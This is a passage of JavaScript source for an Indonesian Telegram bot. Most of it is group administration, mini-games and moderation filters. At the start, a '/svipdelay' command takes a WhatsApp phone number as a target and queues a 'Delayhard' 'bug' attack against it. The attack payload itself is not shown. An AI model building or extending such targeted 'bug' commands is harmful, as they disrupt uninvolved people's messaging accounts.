    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }
  
  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /svipdelay 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id,
    `✅ svipdelay process mengirim for ${rawNumber}`,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await Delayhard(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ svipdelay bug selesai untuk ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ svipdelay bug gagal for ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    }
  });
});

//------------------(AWAL OF FUNCTION)--------------------//

//------------------(AKHIR OF FUNCTION)--------------------//
bot.command("approved", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const chatId = args[0];

  if (!chatId) {
    return ctx.reply("🪧 Format: /approved -100xxxxxxxxxx");
  }

  if (isGroupApproved(chatId)) {
    return ctx.reply("⚠️ Group ini sudah di-approve.");
  }

  approvedGroups.push(String(chatId));
  saveApprovedGroups();

  if (pendingGroups.has(String(chatId))) {
    clearTimeout(pendingGroups.get(String(chatId)).timeout);
    pendingGroups.delete(String(chatId));
  }

  try {
    await ctx.telegram.sendMessage(
      chatId,
      "✅ Group ini telah di-approve oleh owner. Bot sekarang aktif di sini."
    );
  } catch (e) {}

  return ctx.reply(`✅ Group ${chatId} berhasil di-approve.`);
});

bot.command("unapproved", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const chatId = args[0];

  if (!chatId) {
    return ctx.reply("🪧 Format: /unapproved -100xxxxxxxxxx");
  }

  if (!isGroupApproved(chatId)) {
    return ctx.reply("⚠️ Group ini belum di-approve.");
  }

  approvedGroups = approvedGroups.filter((id) => id !== String(chatId));
  saveApprovedGroups();

  try {
    await ctx.telegram.sendMessage(
      chatId,
      "⚠️ Approval group ini dicabut oleh owner. Bot akan nonaktif di sini."
    );
  } catch (e) {}

  return ctx.reply(`✅ Approval group ${chatId} berhasil dicabut.`);
});

bot.command("listapprovedgroup", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  if (approvedGroups.length === 0) {
    return ctx.reply("📭 Belum ada group yang di-approve.");
  }

  const text = approvedGroups.map((id, i) => `${i + 1}. ${id}`).join("\n");
  return ctx.reply(`📋 Daftar group approved:\n\n${text}`);
});

bot.command("blockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ownerID)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const commandName = normalizeCommandName(args[0]);

  if (!commandName) {
    return ctx.reply("🪧 Format: /blockcmd namacommand");
  }

  if (["blockcmd", "unblockcmd", "listblockcmd"].includes(commandName)) {
    return ctx.reply("❌ Command ini tidak bisa diblokir.");
  }

  if (blockedCommands.includes(commandName)) {
    return ctx.reply(`⚠️ Command /${commandName} sudah diblokir.`);
  }

  blockedCommands.push(commandName);
  saveBlockedCommands();

  return ctx.reply(`✅ Command /${commandName} berhasil diblokir.`);
});

bot.command("unblockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ownerID)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const commandName = normalizeCommandName(args[0]);

  if (!commandName) {
    return ctx.reply("🪧 Format: /unblockcmd namacommand");
  }

  if (!blockedCommands.includes(commandName)) {
    return ctx.reply(`⚠️ Command /${commandName} tidak sedang diblokir.`);
  }

  blockedCommands = blockedCommands.filter(cmd => cmd !== commandName);
  saveBlockedCommands();

  return ctx.reply(`✅ Command /${commandName} berhasil dibuka kembali.`);
});

bot.command("listblockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ownerID)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  if (blockedCommands.length === 0) {
    return ctx.reply("✅ Tidak ada command yang sedang diblokir.");
  }

  const list = blockedCommands.map((cmd, i) => `${i + 1}. /${cmd}`).join("\n");

  return ctx.reply(
    `📋 Daftar command yang diblokir:\n\n${list}`
  );
});

// ================================
// COMMAND: ADD PREMIUM GROUP
// /addpremgrup
// ================================
bot.command("addpremgrup", ownerOnly(), async (ctx) => {
  const type = ctx.chat?.type;
  if (type === "private") return ctx.reply("❌ Pakai command ini di grup.");

  addPremGroup(ctx.chat.id);

  const title = escapeHtml(ctx.chat?.title || "Unknown Group");
  return ctx.reply(
    `✅ ☇ <b>${title}</b> berhasil ditambahkan sebagai Group premium`,
    { parse_mode: "HTML" }
  );
});

// ================================
// COMMAND: DELETE PREMIUM GROUP
// /delpremgrup
// ================================
bot.command("delpremgrup", ownerOnly(), async (ctx) => {
  const type = ctx.chat?.type;
  if (type === "private") return ctx.reply("❌ Pakai command ini di grup.");

  delPremGroup(ctx.chat.id);

  const title = escapeHtml(ctx.chat?.title || "Unknown Group");
  return ctx.reply(
    `🗑 ☇ <b>${title}</b> berhasil dihapus sebagai group premium sampai`,
    { parse_mode: "HTML" }
  );
});

// ================================
// COMMAND: LIST PREMIUM GROUP
// /listpremgrup
// ================================
bot.command("listpremgrup", ownerOnly(), async (ctx) => {
  const db = loadPremGroups();
  if (!db.groups.length) return ctx.reply("📭 Tidak ada grup premium.");

  const lines = db.groups.map((id, i) => `${i + 1}. <code>${id}</code>`).join("\n");
  return ctx.reply(`📌 <b>LIST GRUP PREMIUM</b>\n\n${lines}`, { parse_mode: "HTML" });
});

// ================================
// COMMAND: /ttt
// ================================
bot.command("ttt", async (ctx) => {
  if (!ctx.chat || (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup")) {
    return ctx.reply("❌ Game ini hanya bisa dimainkan di grup.");
  }

  const chatId = ctx.chat.id;

  if (tttGames.has(chatId)) {
    return ctx.reply("⚠️ Sudah ada game Tic Tac Toe yang berjalan di grup ini.");
  }

  const gameId = Date.now().toString().slice(-6);

  const game = {
    id: gameId,
    board: tttNewBoard(),
    players: {
      X: ctx.from,
      O: null
    },
    turn: "X",
    messageId: null,
    started: false
  };

  tttGames.set(chatId, game);

  const sent = await ctx.reply( `<blockquote>
🎮 𝐓𝐈𝐂 𝐓𝐀𝐂 𝐓𝐎𝐄 𝐆𝐀𝐌𝐄 🎮

❌ X : <b>${tttSafeName(ctx.from)}</b>
⭕ O : <b>Belum join</b>

<i>Klik tombol di bawah untuk join sebagai O</i>
</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⭕ Join Game", callback_data: `tttjoin_${chatId}_${gameId}` }]
        ]
      }
    }
  );

  game.messageId = sent.message_id;
});

// ================================
// COMMAND: /tttstop
// ================================
bot.command("tttstop", async (ctx) => {
  const chatId = ctx.chat.id;

  if (!tttGames.has(chatId)) {
    return ctx.reply("❌ Tidak ada game Tic Tac Toe yang sedang berjalan.");
  }

  tttGames.delete(chatId);
  return ctx.reply("🛑 Game Tic Tac Toe dihentikan.");
});

// ================================
// COMMAND: /mypoint
// ================================
bot.command("mypoint", async (ctx) => {
  const row = getUserPoint(ctx.from.id);
  if (!row) {
    return ctx.reply("📌 Kamu belum punya point.");
  }

  return ctx.reply( `<blockquote>
🏅 𝐌𝐘 𝐏𝐎𝐈𝐍𝐓 🏅

👤 <b>${row.name}</b>
⭐ Point: <b>${row.points}</b>

🏆 Win: <b>${row.win}</b>
🤝 Draw: <b>${row.draw}</b>
💀 Lose: <b>${row.lose}</b>
</blockquote>`,
    { parse_mode: "HTML" }
  );
});

// ================================
// COMMAND: /leaderboard
// ================================
bot.command("leaderboard", async (ctx) => {
  const top = getLeaderboard(10);

  if (!top.length) {
    return ctx.reply("📌 Leaderboard masih kosong.");
  }

  let text = `🏆 <b>LEADERBOARD TIC TAC TOE</b>\n\n`;
  top.forEach((u, i) => {
    text += `${i + 1}. <b>${u.name}</b> — ⭐ <b>${u.points}</b> (W:${u.win} D:${u.draw} L:${u.lose})\n`;
  });

  return ctx.reply(text, { parse_mode: "HTML" });
});

// ================================
// JOIN GAME
// ================================
bot.action(/^tttjoin_(.+)_(.+)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]);
    const gameId = String(ctx.match[2]);
    const game = tttGames.get(chatId);

    if (!game || game.id !== gameId) {
      return ctx.answerCbQuery("❌ Game tidak ditemukan", { show_alert: true });
    }

    if (game.players.O) {
      return ctx.answerCbQuery("⚠️ Slot O sudah diisi", { show_alert: true });
    }

    if (game.players.X.id === ctx.from.id) {
      return ctx.answerCbQuery("❌ Kamu sudah jadi player X", { show_alert: true });
    }

    game.players.O = ctx.from;
    game.started = true;

    await ctx.editMessageText(tttRender(game), {
      parse_mode: "HTML",
      reply_markup: tttBoardKeyboard(chatId, gameId, game.board)
    });

    return ctx.answerCbQuery("✅ Kamu join sebagai O");
  } catch {
    return ctx.answerCbQuery("❌ Error");
  }
});

// ================================
// MOVE
// ================================
bot.action(/^tttmove_(.+)_(.+)_(\d+)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]);
    const gameId = String(ctx.match[2]);
    const index = Number(ctx.match[3]);

    const game = tttGames.get(chatId);
    if (!game || game.id !== gameId) {
      return ctx.answerCbQuery("❌ Game tidak ditemukan", { show_alert: true });
    }

    if (!game.started) {
      return ctx.answerCbQuery("⚠️ Game belum dimulai", { show_alert: true });
    }

    const currentPlayer = game.turn === "X" ? game.players.X : game.players.O;
    if (!currentPlayer || currentPlayer.id !== ctx.from.id) {
      return ctx.answerCbQuery("❌ Bukan giliran kamu", { show_alert: true });
    }

    if (game.board[index] !== null) {
      return ctx.answerCbQuery("⚠️ Kotak ini sudah terisi", { show_alert: true });
    }

    game.board[index] = game.turn;

    const winner = tttWinner(game.board);

    if (winner) {
      const winnerUser = winner === "X" ? game.players.X : game.players.O;
      const loserUser = winner === "X" ? game.players.O : game.players.X;

      addWinPoint(winnerUser);
      addLosePoint(loserUser);

      await ctx.editMessageText( `<blockquote>
🏆 𝐓𝐈𝐂 𝐓𝐀𝐂 𝐓𝐎𝐄 𝐒𝐄𝐋𝐄𝐒𝐀𝐈 🏆

<i>🏅 Pemenang:</i>
<b>${tttSafeName(winnerUser)}</b> (${winner})

⭐ +3 point untuk pemenang
</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: tttBoardKeyboard(chatId, gameId, game.board, true)
        }
      );

      tttGames.delete(chatId);
      return ctx.answerCbQuery("🏆 Menang!");
    }

    if (tttDraw(game.board)) {
      addDrawPoint(game.players.X);
      addDrawPoint(game.players.O);

      await ctx.editMessageText( `<blockquote>
🤝 𝐓𝐈𝐂 𝐓𝐀𝐂 𝐓𝐎𝐄 𝐒𝐄𝐋𝐄𝐒𝐀𝐈 🤝

<i>📜 Hasil:</i>
<b>SERI</b>

⭐ +1 point untuk kedua pemain
</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: tttBoardKeyboard(chatId, gameId, game.board, true)
        }
      );

      tttGames.delete(chatId);
      return ctx.answerCbQuery("🤝 Seri");
    }

    game.turn = game.turn === "X" ? "O" : "X";

    await ctx.editMessageText(tttRender(game), {
      parse_mode: "HTML",
      reply_markup: tttBoardKeyboard(chatId, gameId, game.board)
    });

    return ctx.answerCbQuery("✅ Langkah diterima");
  } catch {
    return ctx.answerCbQuery("❌ Error");
  }
});

// ================================
// NOOP
// ================================
bot.action(/^tttnoop_(.+)_(.+)$/, async (ctx) => {
  return ctx.answerCbQuery("⚠️ Game sudah selesai");
});

// ================================
// /suit
// ================================
bot.command("suit", async (ctx) => {
  if (!ctx.chat || (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup")) {
    return ctx.reply("❌ Game ini hanya bisa dimainkan di grup.");
  }

  const chatId = ctx.chat.id;

  if (suitGames.has(chatId)) {
    return ctx.reply("⚠️ Sudah ada game Suit yang berjalan di grup ini.");
  }

  const gameId = Date.now().toString().slice(-6);

  const game = {
    id: gameId,
    p1: ctx.from,
    p2: null,
    p1Choice: null,
    p2Choice: null,
    started: false,
    messageId: null
  };

  suitGames.set(chatId, game);

  const sent = await ctx.reply( `<blockquote>
🎮 𝐒𝐔𝐈𝐓 𝐏𝐕𝐏 𝐆𝐀𝐌𝐄 🎮

👤 Player 1: <b>${suitName(ctx.from)}</b>
👤 Player 2: <b>Belum join</b>

<i>Klik tombol di bawah untuk join game.</i>
</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⚔️ Join Suit", callback_data: `suitjoin_${chatId}_${gameId}` }]
        ]
      }
    }
  );

  game.messageId = sent.message_id;
});

// ================================
// /suitstop
// ================================
bot.command("suitstop", async (ctx) => {
  const chatId = ctx.chat.id;

  if (!suitGames.has(chatId)) {
    return ctx.reply("❌ Tidak ada game Suit yang berjalan.");
  }

  suitGames.delete(chatId);
  return ctx.reply("🛑 Game Suit dibatalkan.");
});

// ================================
// JOIN
// ================================
bot.action(/^suitjoin_(.+)_(.+)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]);
    const gameId = String(ctx.match[2]);
    const game = suitGames.get(chatId);

    if (!game || game.id !== gameId) {
      return ctx.answerCbQuery("❌ Game tidak ditemukan", { show_alert: true });
    }

    if (game.p2) {
      return ctx.answerCbQuery("⚠️ Player 2 sudah ada", { show_alert: true });
    }

    if (game.p1.id === ctx.from.id) {
      return ctx.answerCbQuery("❌ Kamu sudah jadi player 1", { show_alert: true });
    }

    game.p2 = ctx.from;
    game.started = true;

    await ctx.editMessageText( `<blockquote>
🎮 𝐒𝐔𝐈𝐓 𝐏𝐕𝐏 𝐆𝐀𝐌𝐄 🎮

👤 Player 1: <b>${suitName(game.p1)}</b>
👤 Player 2: <b>${suitName(game.p2)}</b>

Silakan masing-masing pilih:
<i>(klik tombol, pilihan hanya terlihat oleh sistem)</i>
</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: suitPickKeyboard(chatId, gameId)
      }
    );

    return ctx.answerCbQuery("✅ Kamu join sebagai player 2");
  } catch {
    return ctx.answerCbQuery("❌ Error");
  }
});

// ================================
// PICK
// ================================
bot.action(/^suitpick_(.+)_(.+)_(rock|paper|scissors)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]);
    const gameId = String(ctx.match[2]);
    const choice = String(ctx.match[3]);

    const game = suitGames.get(chatId);
    if (!game || game.id !== gameId) {
      return ctx.answerCbQuery("❌ Game tidak ditemukan", { show_alert: true });
    }

    if (!game.started || !game.p2) {
      return ctx.answerCbQuery("⚠️ Game belum siap", { show_alert: true });
    }

    if (ctx.from.id === game.p1.id) {
      if (game.p1Choice) return ctx.answerCbQuery("⚠️ Kamu sudah memilih", { show_alert: true });
      game.p1Choice = choice;
      await ctx.answerCbQuery(`✅ Pilihan kamu: ${suitChoiceLabel(choice)}`, { show_alert: true });
    } else if (ctx.from.id === game.p2.id) {
      if (game.p2Choice) return ctx.answerCbQuery("⚠️ Kamu sudah memilih", { show_alert: true });
      game.p2Choice = choice;
      await ctx.answerCbQuery(`✅ Pilihan kamu: ${suitChoiceLabel(choice)}`, { show_alert: true });
    } else {
      return ctx.answerCbQuery("❌ Kamu bukan player game ini", { show_alert: true });
    }

    if (!game.p1Choice || !game.p2Choice) {
      const p1Done = game.p1Choice ? "✅" : "⌛";
      const p2Done = game.p2Choice ? "✅" : "⌛";

      await ctx.editMessageText( `<blockquote>
🎮 𝐒𝐔𝐈𝐓 𝐏𝐕𝐏 𝐆𝐀𝐌𝐄 🎮

👤 ${suitName(game.p1)} ${p1Done}
👤 ${suitName(game.p2)} ${p2Done}

<i>Menunggu kedua pemain memilih...</i>
</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: suitPickKeyboard(chatId, gameId)
        }
      ).catch(() => {});

      return;
    }

    // hasil
    const result = suitWin(game.p1Choice, game.p2Choice);

    if (result === "draw") {
      addSuitDraw(game.p1);
      addSuitDraw(game.p2);

      await ctx.editMessageText( `<blockquote>
🤝 𝐒𝐔𝐈𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈 🤝

👤 ${suitName(game.p1)} = ${suitChoiceLabel(game.p1Choice)}
👤 ${suitName(game.p2)} = ${suitChoiceLabel(game.p2Choice)}

Hasil: <b>SERI</b>
</blockquote>`,
        { parse_mode: "HTML" }
      );

      suitGames.delete(chatId);
      return;
    }

    const winner = result === "p1" ? game.p1 : game.p2;
    const loser = result === "p1" ? game.p2 : game.p1;

    addSuitWin(winner);
    addSuitLose(loser);

    await ctx.editMessageText( `<blockquote>
🏆 𝐒𝐔𝐈𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈 🏆

👤 ${suitName(game.p1)} = ${suitChoiceLabel(game.p1Choice)}
👤 ${suitName(game.p2)} = ${suitChoiceLabel(game.p2Choice)}

<i>Pemenang:</i>
<b>${suitName(winner)}</b>

⭐ +2 point
</blockquote>`,
      { parse_mode: "HTML" }
    );

    suitGames.delete(chatId);
  } catch {
    return ctx.answerCbQuery("❌ Error");
  }
});

// FUNCTION EKSEKUSI
async function runAutoAction(ctx, userId, reason = "Melanggar aturan grup") {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return false;

    const mode = autoActionGroups.get(ctx.chat.id);
    if (!mode) return false;

    const target = await ctx.getChatMember(userId);
    if (["creator", "administrator"].includes(target.status)) return false;

    if (mode === "ban") {
      await ctx.telegram.banChatMember(ctx.chat.id, userId);
      await ctx.reply(`🚫 User di-ban.\nAlasan: ${reason}`);
      return true;
    }

    if (mode === "kick") {
      await ctx.telegram.banChatMember(ctx.chat.id, userId);
      await ctx.telegram.unbanChatMember(ctx.chat.id, userId);
      await ctx.reply(`👢 User di-kick.\nAlasan: ${reason}`);
      return true;
    }

    return false;
  } catch (err) {
    console.log("RUN AUTO ACTION ERROR:", err.message);
    return false;
  }
}

//---------(DETEKSI BOT JOIN GB ) ---------//
bot.on("my_chat_member", async (ctx) => {
  try {
    const update = ctx.update.my_chat_member;
    const newStatus = update.new_chat_member.status;
    const oldStatus = update.old_chat_member.status;
    const chat = update.chat;

    const isGroup = chat.type === "group" || chat.type === "supergroup";
    if (!isGroup) return;

    const chatId = String(chat.id);
    const chatTitle = chat.title || "Tanpa Nama";

    // bot baru masuk / diundang ke group
    const joinedStatuses = ["member", "administrator"];
    const oldLeftStatuses = ["left", "kicked"];

    if (joinedStatuses.includes(newStatus) && oldLeftStatuses.includes(oldStatus)) {
      if (isGroupApproved(chatId)) return;

      await ctx.telegram.sendMessage(
        chat.id,
        "⚠️ Bot masuk ke group ini tapi belum di-approve owner.\n\nJika dalam 10 menit tidak di-approve, bot akan keluar otomatis."
      );

      // notif ke owner
      await ctx.telegram.sendMessage(
        ownerID,
        `🚨 BOT DITAMBAHKAN KE GROUP BARU\n\n` +
        `Nama Group: ${chatTitle}\n` +
        `Chat ID: ${chatId}\n\n` +
        `Gunakan:\n` +
        `/approved ${chatId}\n\n` +
        `Jika ingin mengizinkan bot aktif di group tersebut.`
      );

      // simpan pending + timer 10 menit
      if (pendingGroups.has(chatId)) {
        clearTimeout(pendingGroups.get(chatId).timeout);
      }

      const timeout = setTimeout(async () => {
        try {
          if (!isGroupApproved(chatId)) {
            await ctx.telegram.sendMessage(
              chat.id,
              "❌ Group tidak di-approve dalam 10 menit. Bot keluar otomatis."
            );
            await ctx.telegram.leaveChat(chat.id);
          }
        } catch (e) {
          console.error("Gagal leave group:", e.message);
        } finally {
          pendingGroups.delete(chatId);
        }
      }, 10 * 60 * 1000);

      pendingGroups.set(chatId, {
        title: chatTitle,
        timeout
      });
    }
  } catch (err) {
    console.error("Error my_chat_member:", err.message);
  }
});

// FILTER LINK
bot.on("text", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    // cek apakah fitur aktif
    if (!antiLink.has(ctx.chat.id)) return;

    const text = ctx.message.text || "";

    const linkRegex = /(https?:\/\/\S+|t\.me\/\S+|wa\.me\/\S+|chat\.whatsapp\.com\/\S+|www\.\S+)/gi;

    if (!linkRegex.test(text)) return;

    // whitelist (boleh diubah)
    const whitelist = ["youtube.com", "youtu.be"];
    const lower = text.toLowerCase();

    if (whitelist.some((d) => lower.includes(d))) return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (["creator", "administrator"].includes(member.status)) return;

    // hapus pesan
    try {
      await ctx.deleteMessage();
    } catch {}

    ctx.reply(
      `🚫 ${ctx.from.first_name}, link tidak diizinkan!`,
      { reply_to_message_id: ctx.message.message_id }
    );

  } catch (err) {
    console.log("ANTI LINK ERROR:", err.message);
  }
});

// DETEKSI MEMBER BARU
bot.on("new_chat_members", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;
    if (!antiBot.has(ctx.chat.id)) return;

    const newMembers = ctx.message.new_chat_members || [];
    if (!newMembers.length) return;

    for (const user of newMembers) {
      if (!user.is_bot) continue;

      try {
        await ctx.banChatMember(user.id);
      } catch {
        try {
          await ctx.kickChatMember(user.id);
        } catch {}
      }

      try {
        await ctx.reply(
          `🤖 Bot @${user.username || user.first_name} tidak diizinkan di grup ini dan telah dikeluarkan.`
        );
      } catch {}
    }
  } catch (err) {
    console.log("ANTIBOT FILTER ERROR:", err.message);
  }
});

// FILTER TEXT
bot.on("text", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;
    if (!antiNsfw.has(ctx.chat.id)) return;

    const text = (ctx.message.text || "").toLowerCase();
    if (!text) return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (["creator", "administrator"].includes(member.status)) return;

    const hit = nsfwWords.find((word) => text.includes(word));
    if (!hit) return;

    try {
      await ctx.deleteMessage();
    } catch {}

    return ctx.reply(
      `🚫 ${ctx.from.first_name}, pesan NSFW tidak diizinkan di grup ini.`,
      { reply_to_message_id: ctx.message.message_id }
    );
  } catch (err) {
    console.log("ANTI NSFW FILTER ERROR:", err.message);
  }
});

// FILTER SPAM
bot.on("message", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;
    if (!antiSpam.has(ctx.chat.id)) return;
    if (!ctx.from || ctx.from.is_bot) return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (["creator", "administrator"].includes(member.status)) return;

    const key = `${ctx.chat.id}:${ctx.from.id}`;
    const now = Date.now();

    let data = spamTracker.get(key);
    if (!data) {
      data = {
        count: 1,
        firstMessageTime: now,
        warned: false
      };
      spamTracker.set(key, data);
      return;
    }

    if (now - data.firstMessageTime > SPAM_INTERVAL) {
      data.count = 1;
      data.firstMessageTime = now;
      data.warned = false;
      spamTracker.set(key, data);
      return;
    }

    data.count += 1;
    spamTracker.set(key, data);

    if (data.count >= SPAM_LIMIT) {
      try {
        await ctx.deleteMessage();
      } catch {}

      if (!data.warned) {
        data.warned = true;
        spamTracker.set(key, data);

        try {
          await ctx.reply(
            `🚫 ${ctx.from.first_name}, jangan spam di grup ini.`,
            { reply_to_message_id: ctx.message.message_id }
          );
        } catch {}
      }
    }
  } catch (err) {
    console.log("ANTISPAM FILTER ERROR:", err.message);
  }
});

// FILTER PROMOSI
bot.on("text", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;
    if (!antiPromosi.has(ctx.chat.id)) return;

    const text = (ctx.message.text || "").toLowerCase().trim();
    if (!text) return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (["creator", "administrator"].includes(member.status)) return;

    const hit = promosiWords.find((word) => text.includes(word));
    if (!hit) return;

    try {
      await ctx.deleteMessage();
    } catch {}

    return ctx.reply(
      `🚫 ${ctx.from.first_name}, promosi tidak diizinkan di grup ini.`,
      { reply_to_message_id: ctx.message.message_id }
    );
  } catch (err) {
    console.log("ANTI PROMOSI FILTER ERROR:", err.message);
  }
});

// FILTER AUTO DELETE
bot.on("message", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const delay = autoDelete.get(ctx.chat.id);
    if (!delay) return;

    if (!ctx.message.message_id) return;

    // skip admin
    const member = await ctx.getChatMember(ctx.from.id);
    if (["creator", "administrator"].includes(member.status)) return;

    setTimeout(async () => {
      try {
        await ctx.deleteMessage(ctx.message.message_id);
      } catch {}
    }, delay * 1000);

  } catch (err) {
    console.log("AUTODELETE ERROR:", err.message);
  }
});

// KIRIM WELCOME SAAT ADA MEMBER BARU
bot.on("new_chat_members", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const data = welcomeSettings.get(ctx.chat.id);
    if (!data || !data.enabled || !data.text) return;

    const newMembers = ctx.message.new_chat_members || [];
    if (!newMembers.length) return;

    for (const user of newMembers) {
      const name = [user.first_name, user.last_name].filter(Boolean).join(" ") || "Member";
      const username = user.username ? "@" + user.username : "-";
      const group = ctx.chat.title || "Group";

      const message = data.text
        .replace(/{name}/g, name)
        .replace(/{username}/g, username)
        .replace(/{group}/g, group);

      await ctx.reply(message);
    }
  } catch (err) {
    console.log("WELCOME SEND ERROR:", err.message);
  }
});

// KIRIM GOODBYE SAAT MEMBER KELUAR / DIKICK
bot.on("left_chat_member", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const data = goodbyeSettings.get(ctx.chat.id);
    if (!data || !data.enabled || !data.text) return;

    const user = ctx.message.left_chat_member;
    if (!user) return;

    const name =
      [user.first_name, user.last_name].filter(Boolean).join(" ") || "Member";
    const username = user.username ? "@" + user.username : "-";
    const group = ctx.chat.title || "Group";

    const message = data.text
      .replace(/{name}/g, name)
      .replace(/{username}/g, username)
      .replace(/{group}/g, group);

    await ctx.reply(message);
  } catch (err) {
    console.log("GOODBYE SEND ERROR:", err.message);
  }
});

// FILTER
bot.on("text", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;
    if (!aiFilterGroups.has(ctx.chat.id)) return;

    const text = ctx.message.text || "";
    if (!text.trim()) return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (["creator", "administrator"].includes(member.status)) return;

    const result = analyzeMessage(text);
    if (!result.flagged) return;

    try {
      await ctx.deleteMessage();
    } catch {}

    return ctx.reply(
      `🤖 ${ctx.from.first_name}, pesan terdeteksi oleh AI Filter.\nAlasan: ${result.reasons.join(", ")}`,
      { reply_to_message_id: ctx.message.message_id }
    );
  } catch (err) {
    console.log("AI FILTER ERROR:", err.message);
  }
});

// FILTER MEMBER BARU
bot.on("new_chat_members", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;
    if (!antiFake.has(ctx.chat.id)) return;

    const newMembers = ctx.message.new_chat_members || [];
    if (!newMembers.length) return;

    for (const user of newMembers) {
      if (user.is_bot) continue;

      const result = isSuspiciousAccount(user);
      if (!result.suspicious) continue;

      try {
        await ctx.telegram.banChatMember(ctx.chat.id, user.id);
        await ctx.telegram.unbanChatMember(ctx.chat.id, user.id);
      } catch {}

      await ctx.reply(
        `🚫 Akun mencurigakan terdeteksi dan dikeluarkan.\n` +
        `👤 Nama: ${user.first_name || "-"}\n` +
        `📌 Alasan: ${result.reasons.join(", ")}`
      );
    }
  } catch (err) {
    console.log("ANTIFAKE FILTER ERROR:", err.message);
  }
});

// FILTER SLOW MODE
bot.on("message", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;
    if (!ctx.from || ctx.from.is_bot) return;

    const delay = slowModeGroups.get(ctx.chat.id);
    if (!delay) return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (["creator", "administrator"].includes(member.status)) return;

    const key = `${ctx.chat.id}:${ctx.from.id}`;
    const now = Date.now();
    const lastTime = slowModeUsers.get(key) || 0;
    const waitMs = delay * 1000;

    if (now - lastTime < waitMs) {
      const sisa = Math.ceil((waitMs - (now - lastTime)) / 1000);

      try {
        await ctx.deleteMessage();
      } catch {}

      try {
        await ctx.reply(
          `⏳ ${ctx.from.first_name}, tunggu ${sisa} detik sebelum kirim pesan lagi.`,
          { reply_to_message_id: ctx.message.message_id }
        );
      } catch {}

      return;
    }

    slowModeUsers.set(key, now);
  } catch (err) {
    console.log("SLOWMODE FILTER ERROR:", err.message);
  }
});

// FILTER MEMBER BARU
bot.on("new_chat_members", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;
    if (!antiRaidGroups.has(ctx.chat.id)) return;

    const now = Date.now();
    const newMembers = ctx.message.new_chat_members || [];
    if (!newMembers.length) return;

    let data = raidTracker.get(ctx.chat.id) || {
      joins: [],
      raidMode: false,
      until: 0
    };

    // bersihin timestamp lama
    data.joins = data.joins.filter((t) => now - t <= RAID_INTERVAL);

    // kalau masih raid mode dan waktunya habis, reset
    if (data.raidMode && now > data.until) {
      data.raidMode = false;
      data.until = 0;
      data.joins = [];
    }

    // kalau raid mode aktif, kick semua member baru
    if (data.raidMode) {
      for (const user of newMembers) {
        try {
          await ctx.telegram.banChatMember(ctx.chat.id, user.id);
          await ctx.telegram.unbanChatMember(ctx.chat.id, user.id);
        } catch {}
      }

